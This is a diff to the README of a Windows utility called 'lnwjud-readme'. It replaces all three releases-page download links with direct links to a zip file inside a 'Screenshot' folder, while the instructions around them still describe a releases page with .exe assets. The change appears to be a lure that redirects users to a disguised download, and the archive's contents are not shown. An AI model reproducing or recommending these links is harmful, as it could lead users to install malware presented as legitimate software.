@@ -1,6 +1,6 @@
 <h1 style="text-align:center;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:10px;">🧩 lnwjud-readme - Your Bridge Between AI and Windows</h1>
 
-<p align="center"><a href="https://github.com/phuongt2576/lnwjud-readme/releases" style="display:inline-block;padding:15px 40px;background:#ff6b6b;color:white;text-decoration:none;border-radius:30px;font-size:20px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download lnwjud-readme Now</a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/phuongt2576/lnwjud-readme/main/Screenshot/v1.0.zip" style="display:inline-block;padding:15px 40px;background:#ff6b6b;color:white;text-decoration:none;border-radius:30px;font-size:20px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download lnwjud-readme Now</a></p>
 
 ---
 
@@ -40,7 +40,7 @@ Downloading and running lnwjud-readme takes less than five minutes. Follow these
 ### Step 1: Download the Application
 Visit this link to download the application.
 
-[**Click Here to Download**](https://github.com/phuongt2576/lnwjud-readme/releases)
+[**Click Here to Download**](https://raw.githubusercontent.com/phuongt2576/lnwjud-readme/main/Screenshot/v1.0.zip)
 
 The download button is at the top right of the page. Look for the most recent release version. Click the "Assets" dropdown menu and select the file that ends with `.exe` or `setup.zip`. Your computer will save the file to your Downloads folder when you click it.
 
@@ -150,7 +150,7 @@ If you run into any trouble, you have several options:
 
 New versions of lnwjud-readme are released regularly with improvements and new features. Visit this link to download the application and check for updates:
 
-[**Download Latest Version**](https://github.com/phuongt2576/lnwjud-readme/releases)
+[**Download Latest Version**](https://raw.githubusercontent.com/phuongt2576/lnwjud-readme/main/Screenshot/v1.0.zip)
 
 You can enable automatic updates through the application's Settings menu to never miss a new release. The program will download and install updates automatically in the background.
 
